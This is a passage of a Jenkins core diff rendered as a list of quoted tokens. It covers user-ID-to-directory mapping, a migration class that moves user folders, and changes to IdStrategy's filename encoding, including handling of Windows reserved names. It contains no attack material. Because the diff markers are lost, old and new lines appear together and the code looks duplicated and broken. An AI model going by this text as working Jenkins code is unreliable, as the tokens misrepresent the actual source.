"null", ")", "{", "synchronized", "(", "this", ")", "{", "directoryName", "=", "idToDirectoryNameMap", ".", "get", "(", "idKey", ")", ";", "if", "(", "directoryName", "=", "=", "null", ")", "{", "directory", "=", "createDirectoryForNewUser", "(", "userId", ")", ";", "directoryName", "=", "directory", ".", "getName", "(", ");", "idToDirectoryNameMap", ".", "put", "(", "idKey", ",", "directoryName", ")", ";", "if", "(", "saveToDisk", ")", "{", "save", "(", ");", "}", "}", "}", "}", "return", "directory", "=", "=", "null", "?", "new", "File", "(", "usersDirectory", ",", "directoryName", ")", ":", "directory", ";", "}", "boolean", "isMapped", "(", "String", "userId", ")", "{", "return", "idToDirectoryNameMap", ".", "containsKey", "(", "getIdStrategy", "(", ").", "keyFor", "(", "userId", ")", ");", "}", "Set", "<", "String", ">", "getConvertedUserIds", "(", ")", "{", "return", "Collections", ".", "unmodifiableSet", "(", "idToDirectoryNameMap", ".", "keySet", "(", "))", ";", "}", "void", "remove", "(", "String", "userId", ")", "throws", "IOException", "{", "idToDirectoryNameMap", ".", "remove", "(", "getIdStrategy", "(", ").", "keyFor", "(", "userId", ")", ");", "save", "(", ");", "}", "void", "clear", "(", ")", "{", "idToDirectoryNameMap", ".", "clear", "(", ");", "}", "void", "reload", "(", ")", "throws", "IOException", "{", "clear", "(", ");", "load", "(", ");", "}", "protected", "IdStrategy", "getIdStrategy", "(", ")", "{", "return", "User", ".", "idStrategy", "(", ");", "}", "protected", "File", "getUsersDirectory", "(", ")", "{", "return", "User", ".", "getRootDir", "(", ");", "}", "private", "XmlFile", "getXmlConfigFile", "(", ")", "{", "File", "file", "=", "getConfigFile", "(", "usersDirectory", ")", ";", "return", "new", "XmlFile", "(", "XSTREAM", ",", "file", ")", ";", "}", "static", "File", "getConfigFile", "(", "File", "usersDirectory", ")", "{", "return", "new", "File", "(", "usersDirectory", ",", "MAPPING_FILE", ")", ";", "}", "private", "File", "createDirectoryForNewUser", "(", "String", "userId", ")", "throws", "IOException", "{", "try", "{", "Path", "tempDirectory", "=", "Files", ".", "createTempDirectory", "(", "Util", ".", "fileToPath", "(", "usersDirectory", ")", ",", "generatePrefix", "(", "userId", ")", ");", "return", "tempDirectory", ".", "toFile", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "\"", "Error", "creating", "directory", "for", "user", ":", "\"", "+", "userId", ",", "e", ")", ";", "throw", "e", ";", "}", "}", "private", "String", "generatePrefix", "(", "String", "userId", ")", "{", "String", "fullPrefix", "=", "PREFIX_PATTERN", ".", "matcher", "(", "userId", ")", ".", "replaceAll", "(", "\"\"", ");", "return", "fullPrefix", ".", "length", "(", ")", ">", "PREFIX_MAX", "-", "1", "?", "fullPrefix", ".", "substring", "(", "0", ",", "PREFIX_MAX", "-", "1", ")", "+", "'", "_", "'", ":", "fullPrefix", "+", "'", "_", "'", ";", "}", "private", "File", "createUsersDirectoryAsNeeded", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "getUsersDirectory", "(", ");", "if", "(", "!", "usersDirectory", ".", "exists", "(", "))", "{", "try", "{", "Files", ".", "createDirectory", "(", "usersDirectory", ".", "toPath", "(", "))", ";", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "\"", "Unable", "to", "create", "users", "directory", ":", "\"", "+", "usersDirectory", ",", "e", ")", ";", "throw", "e", ";", "}", "}", "return", "usersDirectory", ";", "}", "synchronized", "void", "save", "(", ")", "throws", "IOException", "{", "try", "{", "getXmlConfigFile", "(", ").", "write", "(", "this", ")", ";", "}", "catch", "(", "IOException", "ioe", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Error", "saving", "userId", "mapping", "file", ".", "\",", "ioe", ")", ";", "throw", "ioe", ";", "}", "}", "private", "void", "load", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "getIdStrategy", "(", "))", ";", "if", "(", "migrator", ".", "needsMigration", "(", "))", "{", "try", "{", "migrator", ".", "migrateUsers", "(", "this", ")", ";", "}", "catch", "(", "IOException", "ioe", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "\"", "Error", "migrating", "users", ".", "\",", "ioe", ")", ";", "throw", "ioe", ";", "}", "}", "else", "{", "XmlFile", "config", "=", "getXmlConfigFile", "(", ");", "try", "{", "config", ".", "unmarshal", "(", "this", ")", ";", "}", "catch", "(", "NoSuchFileException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "User", "id", "mapping", "file", "does", "not", "exist", ".", "It", "will", "be", "created", "when", "a", "user", "is", "saved", ".", "\")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Failed", "to", "load", "\"", "+", "config", ",", "e", ")", ";", "throw", "e", ";", "}", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "104", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "jenkins", ".", "model", ".", "IdStrategy", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "restrictions", ".", "NoExternalUse", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "CopyOption", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "StandardCopyOption", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "logging", ".", "Level", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "class", "UserIdMigrator", "{", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "UserIdMigrator", ".", "class", ".", "getName", "(", "))", ";", "private", "static", "final", "String", "EMPTY_USERNAME_DIRECTORY_NAME", "=", "\"", "emptyUsername", "\"", ";", "private", "final", "File", "usersDirectory", ";", "private", "final", "IdStrategy", "idStrategy", ";", "UserIdMigrator", "(", "File", "usersDirectory", ",", "IdStrategy", "idStrategy", ")", "{", "this", ".", "usersDirectory", "=", "usersDirectory", ";", "this", ".", "idStrategy", "=", "idStrategy", ";", "}", "boolean", "needsMigration", "(", ")", "{", "File", "mappingFile", "=", "UserIdMapper", ".", "getConfigFile", "(", "usersDirectory", ")", ";", "if", "(", "mappingFile", ".", "exists", "(", ")", "&", "&", "mappingFile", ".", "isFile", "(", "))", "{", "LOGGER", ".", "finest", "(", "\"", "User", "mapping", "file", "already", "exists", ".", "No", "migration", "needed", ".", "\")", ";", "return", "false", ";", "}", "File", "[", "]", "userDirectories", "=", "listUserDirectories", "(", ");", "return", "userDirectories", "!", "=", "null", "&", "&", "userDirectories", ".", "length", ">", "0", ";", "}", "private", "File", "[", "]", "listUserDirectories", "(", ")", "{", "return", "usersDirectory", ".", "listFiles", "(", "file", "-", ">", "file", ".", "isDirectory", "(", ")", "&", "&", "new", "File", "(", "file", ",", "User", ".", "CONFIG_XML", ")", ".", "exists", "(", "))", ";", "}", "Map", "<", "String", ",", "File", ">", "scanExistingUsers", "(", ")", "throws", "IOException", "{", "Map", "<", "String", ",", "File", ">", "users", "=", "new", "HashMap", "<", ">(", ");", "File", "[", "]", "userDirectories", "=", "listUserDirectories", "(", ");", "if", "(", "userDirectories", "!", "=", "null", ")", "{", "for", "(", "File", "directory", ":", "userDirectories", ")", "{", "String", "userId", "=", "idStrategy", ".", "idFromFilename", "(", "directory", ".", "getName", "(", "))", ";", "users", ".", "put", "(", "userId", ",", "directory", ")", ";", "}", "}", "addEmptyUsernameIfExists", "(", "users", ")", ";", "return", "users", ";", "}", "private", "void", "addEmptyUsernameIfExists", "(", "Map", "<", "String", ",", "File", ">", "users", ")", "throws", "IOException", "{", "File", "emptyUsernameConfigFile", "=", "new", "File", "(", "usersDirectory", ",", "User", ".", "CONFIG_XML", ")", ";", "if", "(", "emptyUsernameConfigFile", ".", "exists", "(", "))", "{", "File", "newEmptyUsernameDirectory", "=", "new", "File", "(", "usersDirectory", ",", "EMPTY_USERNAME_DIRECTORY_NAME", ")", ";", "Files", ".", "createDirectory", "(", "newEmptyUsernameDirectory", ".", "toPath", "(", "))", ";", "File", "newEmptyUsernameConfigFile", "=", "new", "File", "(", "newEmptyUsernameDirectory", ",", "User", ".", "CONFIG_XML", ")", ";", "Files", ".", "move", "(", "emptyUsernameConfigFile", ".", "toPath", "(", "),", "newEmptyUsernameConfigFile", ".", "toPath", "(", "))", ";", "users", ".", "put", "(", "\"\"", ",", "newEmptyUsernameDirectory", ")", ";", "}", "}", "void", "migrateUsers", "(", "UserIdMapper", "mapper", ")", "throws", "IOException", "{", "LOGGER", ".", "fine", "(", "\"", "Beginning", "migration", "of", "users", "to", "userId", "mapping", ".", "\")", ";", "Map", "<", "String", ",", "File", ">", "existingUsers", "=", "scanExistingUsers", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "File", ">", "existingUser", ":", "existingUsers", ".", "entrySet", "(", "))", "{", "File", "newDirectory", "=", "mapper", ".", "putIfAbsent", "(", "existingUser", ".", "getKey", "(", "),", "false", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "INFO", ",", "\"", "Migrating", "user", "'", "\"", "+", "existingUser", ".", "getKey", "(", ")", "+", "\"", "'", "from", "'", "users", "/", "\"", "+", "existingUser", ".", "getValue", "(", ").", "getName", "(", ")", "+", "\"", "/'", "to", "'", "users", "/", "\"", "+", "newDirectory", ".", "getName", "(", ")", "+", "\"", "/'", "\")", ";", "Files", ".", "move", "(", "existingUser", ".", "getValue", "(", ").", "toPath", "(", "),", "newDirectory", ".", "toPath", "(", "),", "StandardCopyOption", ".", "REPLACE_EXISTING", ")", ";", "}", "mapper", ".", "save", "(", ");", "LOGGER", ".", "fine", "(", "\"", "Completed", "migration", "of", "users", "to", "userId", "mapping", ".", "\")", ";", "}", "}", "@", "@", "-", "37", ",", "6", "+", "37", ",", "9", "@", "@", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "java", ".", "util", ".", "Comparator", ";", "import", "java", ".", "util", ".", "Locale", ";", "import", "java", ".", "util", ".", "function", ".", "Function", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "/", "**", "*", "The", "strategy", "to", "use", "for", "manipulating", "converting", "names", "(", "e", ".", "g", ".", "user", "names", ",", "group", "names", ",", "etc", ")", "into", "ids", ".", "@", "@", "-", "46", ",", "54", "+", "49", ",", "63", "@", "@", "public", "abstract", "class", "IdStrategy", "extends", "AbstractDescribableImpl", "<", "IdStrategy", ">", "implements", "ExtensionPoint", ",", "Comparator", "<", "String", ">", "{", "private", "static", "final", "Pattern", "PSEUDO_UNICODE_PATTERN", "=", "Pattern", ".", "compile", "(", "\"\\", "\\$", "[", "a", "-", "f0", "-", "9", "]", "{", "4", "}", "\")", ";", "private", "static", "final", "Pattern", "CAPITALIZATION_PATTERN", "=", "Pattern", ".", "compile", "(", "\"~", "[", "a", "-", "z", "]", "\")", ";", "/", "**", "*", "The", "default", "case", "insensitive", "strategy", ".", "*", "/", "public", "static", "IdStrategy", "CASE_INSENSITIVE", "=", "new", "CaseInsensitive", "(", ");", "/", "**", "*", "Converts", "an", "ID", "into", "a", "name", "for", "use", "as", "a", "filename", ".", "The", "return", "value", "must", "not", "contain", "any", "filesystem", "unsafe", "*", "characters", "or", "names", ".", "See", "https", ":", "//", "msdn", ".", "microsoft", ".", "com", "/", "en", "-", "us", "/", "library", "/", "aa365247", ".", "aspx", "for", "information", "on", "reserved", "*", "names", ".", "*", "No", "longer", "used", ".", "This", "method", "is", "now", "a", "no", "-", "op", "but", "the", "signature", "is", "retained", "for", "backward", "compatibility", ".", "*", "*", "@", "param", "id", "the", "id", ".", "*", "@", "return", "the", "name", ".", "Must", "be", "filesystem", "safe", ".", "*", "@", "deprecated", "No", "current", "use", ".", "*", "/", "@", "Nonnull", "public", "abstract", "String", "filenameOf", "(", "@", "Nonnull", "String", "id", ")", ";", "@", "Deprecated", "public", "String", "filenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "return", "null", ";", "}", "/", "**", "*", "Converts", "an", "ID", "into", "a", "name", "for", "use", "as", "a", "filename", ".", "*", "No", "longer", "used", ".", "This", "method", "is", "now", "a", "no", "-", "op", "but", "the", "signature", "is", "retained", "for", "backward", "compatibility", ".", "*", "*", "Legacy", "implementation", "used", "only", "for", "migrating", "old", "style", "config", "files", "to", "the", "new", "implementation", ".", "*", "@", "param", "id", "the", "id", "*", "@", "return", "the", "name", "*", "@", "deprecated", "No", "current", "use", ".", "*", "/", "@", "Nonnull", "@", "Deprecated", "@", "Restricted", "(", "ProtectedExternally", ".", "class", ")", "public", "String", "legacyFilenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "return", "filenameOf", "(", "id", ")", ";", "return", "null", ";", "}", "/", "**", "*", "Converts", "a", "filename", "into", "the", "corresponding", "id", ".", "This", "may", "contain", "filesystem", "unsafe", "characters", ".", "*", "*", "@", "param", "filename", "the", "filename", ".", "*", "@", "return", "the", "corresponding", "id", ".", "*", "@", "since", "1", ".", "577", "*", "@", "deprecated", "Use", "only", "for", "migrating", "to", "new", "format", ".", "After", "the", "migration", "an", "id", "is", "no", "longer", "represented", "by", "a", "filename", "(", "directory", ")", ".", "*", "/", "@", "Deprecated", "public", "String", "idFromFilename", "(", "@", "Nonnull", "String", "filename", ")", "{", "return", "filename", ";", "}", "/", "**", "*", "Converts", "an", "ID", "into", "a", "key", "for", "use", "in", "a", "Java", "Map", ".", "*", "Converts", "an", "ID", "into", "a", "key", "for", "use", "in", "a", "Java", "Map", "or", "similar", ".", "This", "controls", "uniqueness", "of", "ids", "and", "how", "multiple", "different", "*", "ids", "may", "map", "to", "the", "same", "id", ".", "For", "example", ",", "all", "different", "capitalizations", "of", "\"", "Foo", "\"", "may", "map", "to", "the", "same", "value", "\"", "foo", "\"", ".", "*", "*", "@", "param", "id", "the", "id", ".", "*", "@", "return", "the", "key", ".", "*", "/", "@", "Nonnull", "public", "abstract", "String", "keyFor", "(", "@", "Nonnull", "String", "id", ")", ";", "public", "String", "keyFor", "(", "@", "Nonnull", "String", "id", ")", "{", "return", "id", ";", "}", "/", "**", "*", "Compare", "two", "IDs", "and", "return", "{", "@", "code", "true", "}", "IFF", "the", "two", "ids", "are", "the", "same", ".", "Normally", "we", "expect", "that", "this", "should", "be", "@", "@", "-", "109", ",", "7", "+", "121", ",", "7", "@", "@", "public", "boolean", "equals", "(", "@", "Nonnull", "String", "id1", ",", "@", "Nonnull", "String", "id2", ")", "{", "}", "/", "**", "*", "Compare", "tow", "IDs", "and", "return", "their", "sorting", "order", ".", "If", "{", "@", "link", "#", "equals", "(", "String", ",", "String", ")", "}", "is", "{", "@", "code", "true", "}", "then", "this", "*", "Compare", "two", "IDs", "and", "return", "their", "sorting", "order", ".", "If", "{", "@", "link", "#", "equals", "(", "String", ",", "String", ")", "}", "is", "{", "@", "code", "true", "}", "then", "this", "*", "must", "return", "{", "@", "code", "0", "}", "but", "{", "@", "link", "#", "compare", "(", "String", ",", "String", ")", "}", "returning", "{", "@", "code", "0", "}", "need", "not", "imply", "that", "*", "{", "@", "link", "#", "equals", "(", "String", ",", "String", ")", "}", "is", "{", "@", "code", "true", "}", ".", "*", "@", "@", "-", "160", ",", "7", "+", "172", ",", "26", "@", "@", "public", "String", "toString", "(", ")", "{", "*", "Returns", "all", "the", "registered", "{", "@", "link", "IdStrategy", "}", "descriptors", ".", "*", "/", "public", "static", "DescriptorExtensionList", "<", "IdStrategy", ",", "IdStrategyDescriptor", ">", "all", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "getDescriptorList", "(", "IdStrategy", ".", "class", ")", ";", "return", "Jenkins", ".", "get", "(", ").", "getDescriptorList", "(", "IdStrategy", ".", "class", ")", ";", "}", "String", "applyPatternRepeatedly", "(", "@", "Nonnull", "Pattern", "pattern", ",", "@", "Nonnull", "String", "filename", ",", "@", "Nonnull", "Function", "<", "String", ",", "Character", ">", "converter", ")", "{", "StringBuilder", "id", "=", "new", "StringBuilder", "(", ");", "int", "beginIndex", "=", "0", ";", "Matcher", "matcher", "=", "pattern", ".", "matcher", "(", "filename", ")", ";", "while", "(", "matcher", ".", "find", "(", "))", "{", "String", "group", "=", "matcher", ".", "group", "(", ");", "id", ".", "append", "(", "filename", ",", "beginIndex", ",", "matcher", ".", "start", "(", "))", ";", "id", ".", "append", "(", "converter", ".", "apply", "(", "group", ")", ");", "beginIndex", "=", "matcher", ".", "end", "(", ");", "}", "id", ".", "append", "(", "filename", ".", "substring", "(", "beginIndex", ")", ");", "return", "id", ".", "toString", "(", ");", "}", "Character", "convertPseudoUnicode", "(", "String", "matchedGroup", ")", "{", "return", "(", "char", ")", "Integer", ".", "parseInt", "(", "matchedGroup", ".", "substring", "(", "1", ")", ",", "16", ")", ";", "}", "/", "**", "@", "@", "-", "171", ",", "147", "+", "202", ",", "10", "@", "@", "public", "String", "toString", "(", ")", "{", "@", "DataBoundConstructor", "public", "CaseInsensitive", "(", ")", "{", "}", "@", "Override", "@", "Nonnull", "public", "String", "filenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "if", "(", "id", ".", "isEmpty", "(", ")", "|", "|", "id", ".", "matches", "(", "\"[", "a", "-", "zA", "-", "Z0", "-", "9_", ".", "@", "-]", "+\"", "))", "{", "id", "=", "id", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ";", "switch", "(", "id", ")", "{", "case", "\"", "\":", "case", "\"", ".\"", ":", "return", "\"", "$", "002f", "\"", ";", "case", "\"", "..", "\":", "return", "\"", "$", "002e", "$", "002e", "\"", ";", "case", "\"", "con", "\"", ":", "return", "\"", "$", "0063on", "\"", ";", "case", "\"", "prn", "\"", ":", "return", "\"", "$", "0070rn", "\"", ";", "case", "\"", "aux", "\"", ":", "return", "\"", "$", "0061ux", "\"", ";", "case", "\"", "nul", "\"", ":", "return", "\"", "$", "006eul", "\"", ";", "case", "\"", "com1", "\"", ":", "return", "\"", "$", "0063om1", "\"", ";", "case", "\"", "com2", "\"", ":", "return", "\"", "$", "0063om2", "\"", ";", "case", "\"", "com3", "\"", ":", "return", "\"", "$", "0063om3", "\"", ";", "case", "\"", "com4", "\"", ":", "return", "\"", "$", "0063om4", "\"", ";", "case", "\"", "com5", "\"", ":", "return", "\"", "$", "0063om5", "\"", ";", "case", "\"", "com6", "\"", ":", "return", "\"", "$", "0063om6", "\"", ";", "case", "\"", "com7", "\"", ":", "return", "\"", "$", "0063om7", "\"", ";", "case", "\"", "com8", "\"", ":", "return", "\"", "$", "0063om8", "\"", ";", "case", "\"", "com9", "\"", ":", "return", "\"", "$", "0063om9", "\"", ";", "case", "\"", "lpt1", "\"", ":", "return", "\"", "$", "006cpt1", "\"", ";", "case", "\"", "lpt2", "\"", ":", "return", "\"", "$", "006cpt2", "\"", ";", "case", "\"", "lpt3", "\"", ":", "return", "\"", "$", "006cpt3", "\"", ";", "case", "\"", "lpt4", "\"", ":", "return", "\"", "$", "006cpt4", "\"", ";", "case", "\"", "lpt5", "\"", ":", "return", "\"", "$", "006cpt5", "\"", ";", "case", "\"", "lpt6", "\"", ":", "return", "\"", "$", "006cpt6", "\"", ";", "case", "\"", "lpt7", "\"", ":", "return", "\"", "$", "006cpt7", "\"", ";", "case", "\"", "lpt8", "\"", ":", "return", "\"", "$", "006cpt8", "\"", ";", "case", "\"", "lpt9", "\"", ":", "return", "\"", "$", "006cpt9", "\"", ";", "default", ":", "if", "(", "id", ".", "endsWith", "(", "\".", "\")", ")", "{", "return", "id", ".", "substring", "(", "0", ",", "id", ".", "length", "(", ")-", "1", ")", "+\"", "$", "002e", "\"", ";", "}", "else", "if", "(", "id", ".", "startsWith", "(", "\"-", "\")", ")", "{", "return", "\"", "$", "002d", "\"", "+", "id", ".", "substring", "(", "1", ")", ";", "}", "return", "id", ";", "}", "}", "else", "{", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", "id", ".", "length", "(", ")", "+", "16", ")", ";", "for", "(", "char", "c", ":", "id", ".", "toCharArray", "(", "))", "{", "if", "(", "'", "a", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "z", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "A", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "Z", "'", ")", "{", "buf", ".", "append", "(", "Character", ".", "toLowerCase", "(", "c", ")", ");", "}", "else", "if", "(", "'", "0", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "9", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "_", "'", "=", "=", "c", "|", "|", "'", "-'", "=", "=", "c", "|", "|", "'", "'", "=", "=", "c", "|", "|", "'", "@'", "=", "=", "c", "|", "|", "'", ".'", "=", "=", "c", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "{", "buf", ".", "append", "(", "'$", "')", ";", "buf", ".", "append", "(", "StringUtils", ".", "leftPad", "(", "Integer", ".", "toHexString", "(", "c", "&", "0xffff", ")", ",", "4", ",", "'", "0", "'", "))", ";", "}", "}", "return", "buf", ".", "toString", "(", ");", "}", "}", "@", "Nonnull", "@", "Override", "public", "String", "legacyFilenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "return", "id", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ";", "}", "@", "Override", "public", "String", "idFromFilename", "(", "@", "Nonnull", "String", "filename", ")", "{", "if", "(", "filename", ".", "matches", "(", "\"[", "A", "-", "Za", "-", "z0", "-", "9_", ".", "@", "-]", "+\"", "))", "{", "return", "filename", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ";", "}", "else", "{", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", "filename", ".", "length", "(", "))", ";", "final", "char", "[", "]", "chars", "=", "filename", ".", "toCharArray", "(", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "chars", ".", "length", ";", "i", "+", "+)", "{", "char", "c", "=", "chars", "[", "i", "]", ";", "if", "(", "'", "a", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "z", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "A", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "a", "'", ")", "{", "buf", ".", "append", "(", "Character", ".", "toLowerCase", "(", "c", ")", ");", "}", "else", "if", "(", "'", "0", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "9", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "_", "'", "=", "=", "c", "|", "|", "'", ".'", "=", "=", "c", "|", "|", "'", "-'", "=", "=", "c", "|", "|", "'", "'", "=", "=", "c", "|", "|", "'", "@'", "=", "=", "c", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "c", "=", "=", "'", "$'", ")", "{", "StringBuilder", "hex", "=", "new", "StringBuilder", "(", "4", ")", ";", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "try", "{", "buf", ".", "append", "(", "Character", ".", "valueOf", "(", "(", "char", ")", "Integer", ".", "parseInt", "(", "hex", ".", "toString", "(", "),", "16", ")", "))", ";", "}", "catch", "(", "NumberFormatException", "x", ")", "{", "buf", ".", "append", "(", "'$", "')", ".", "append", "(", "hex", ")", ";", "}", "}", "}", "return", "buf", ".", "toString", "(", ");", "}", "String", "id", "=", "applyPatternRepeatedly", "(", "PSEUDO_UNICODE_PATTERN", ",", "filename", ",", "this", ":", ":", "convertPseudoUnicode", ")", ";", "return", "id", ".", "toLowerCase", "(", "Locale", ".", "ENGLISH", ")", ";", "}", "/", "**", "@", "@", "-", "337", ",", "6", "+", "231", ",", "7", "@", "@", "public", "int", "compare", "(", "@", "Nonnull", "String", "id1", ",", "@", "Nonnull", "String", "id2", ")", "{", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "Nonnull", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "Messages", ".", "IdStrategy_CaseInsensitive_DisplayName", "(", ");", "@", "@", "-", "352", ",", "176", "+", "247", ",", "14", "@", "@", "public", "String", "getDisplayName", "(", ")", "{", "@", "DataBoundConstructor", "public", "CaseSensitive", "(", ")", "{", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "@", "Nonnull", "public", "String", "filenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "if", "(", "id", ".", "isEmpty", "(", ")", "|", "|", "id", ".", "matches", "(", "\"[", "a", "-", "z0", "-", "9_", ".", "@", "-]", "+\"", "))", "{", "switch", "(", "id", ")", "{", "case", "\"", "\":", "case", "\"", ".\"", ":", "return", "\"", "$", "002f", "\"", ";", "case", "\"", "..", "\":", "return", "\"", "$", "002e", "$", "002e", "\"", ";", "case", "\"", "con", "\"", ":", "return", "\"", "$", "0063on", "\"", ";", "case", "\"", "prn", "\"", ":", "return", "\"", "$", "0070rn", "\"", ";", "case", "\"", "aux", "\"", ":", "return", "\"", "$", "0061ux", "\"", ";", "case", "\"", "nul", "\"", ":", "return", "\"", "$", "006eul", "\"", ";", "case", "\"", "com1", "\"", ":", "return", "\"", "$", "0063om1", "\"", ";", "case", "\"", "com2", "\"", ":", "return", "\"", "$", "0063om2", "\"", ";", "case", "\"", "com3", "\"", ":", "return", "\"", "$", "0063om3", "\"", ";", "case", "\"", "com4", "\"", ":", "return", "\"", "$", "0063om4", "\"", ";", "case", "\"", "com5", "\"", ":", "return", "\"", "$", "0063om5", "\"", ";", "case", "\"", "com6", "\"", ":", "return", "\"", "$", "0063om6", "\"", ";", "case", "\"", "com7", "\"", ":", "return", "\"", "$", "0063om7", "\"", ";", "case", "\"", "com8", "\"", ":", "return", "\"", "$", "0063om8", "\"", ";", "case", "\"", "com9", "\"", ":", "return", "\"", "$", "0063om9", "\"", ";", "case", "\"", "lpt1", "\"", ":", "return", "\"", "$", "006cpt1", "\"", ";", "case", "\"", "lpt2", "\"", ":", "return", "\"", "$", "006cpt2", "\"", ";", "case", "\"", "lpt3", "\"", ":", "return", "\"", "$", "006cpt3", "\"", ";", "case", "\"", "lpt4", "\"", ":", "return", "\"", "$", "006cpt4", "\"", ";", "case", "\"", "lpt5", "\"", ":", "return", "\"", "$", "006cpt5", "\"", ";", "case", "\"", "lpt6", "\"", ":", "return", "\"", "$", "006cpt6", "\"", ";", "case", "\"", "lpt7", "\"", ":", "return", "\"", "$", "006cpt7", "\"", ";", "case", "\"", "lpt8", "\"", ":", "return", "\"", "$", "006cpt8", "\"", ";", "case", "\"", "lpt9", "\"", ":", "return", "\"", "$", "006cpt9", "\"", ";", "default", ":", "if", "(", "id", ".", "endsWith", "(", "\".", "\")", ")", "{", "return", "id", ".", "substring", "(", 